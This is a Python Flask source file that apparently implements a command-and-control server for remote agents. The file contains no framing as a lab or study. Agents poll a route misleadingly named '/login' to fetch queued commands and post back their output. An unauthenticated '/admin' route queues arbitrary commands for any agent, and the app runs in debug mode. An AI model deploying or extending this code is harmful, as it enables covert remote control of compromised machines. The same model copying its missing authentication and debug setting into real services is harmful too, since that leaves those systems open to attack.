from flask import Flask, request, Response
import redis

r = redis.Redis(host='127.0.0.1', port=6379, db=0, decode_responses=True)

app = Flask(__name__)

@app.route('/admin', methods=['POST'])
def send_command():
    data = request.json
    if request.method == 'POST':
        uuid = data.get('uuid')
        cmd = data.get('command')
        r.rpush(uuid, cmd)
    return "Command Sent!"

@app.route('/login', methods=['GET', 'POST'])
def commander():
    if request.method == 'GET':
        uuid = request.args.get('uuid')
        cache = r.lindex(uuid, -1)
        if r.exists(uuid) == 0:
            r.rpush(uuid, "AGENT REGISTERED")
            r.rpush("agents", uuid)
            print(uuid, "Registered")
            command = ""
        elif "SEEN" in cache or "AGENT REGISTERED" in cache:
            command = ""
        else:
            command = cache
            r.rpush(uuid, "SEEN")
            if r.lindex(uuid, -2) == "exit":
                r.lrem("agents", 0, uuid)
                r.delete(uuid)
                r.delete(f"{uuid}-output")
        return command

    elif request.method == 'POST':
        uuid = request.args.get('uuid')
        data = request.data.decode('utf-8')
        if uuid and data:
            key = f"{uuid}-output"
            r.lpush(key, data)
        else:
            return "ERROR: POST requests only!"
        return "Success"
    else:
        return "Invalid Method"

# This allows you to run the app directly with `python app.py`
if __name__ == '__main__':
    app.run(debug=True)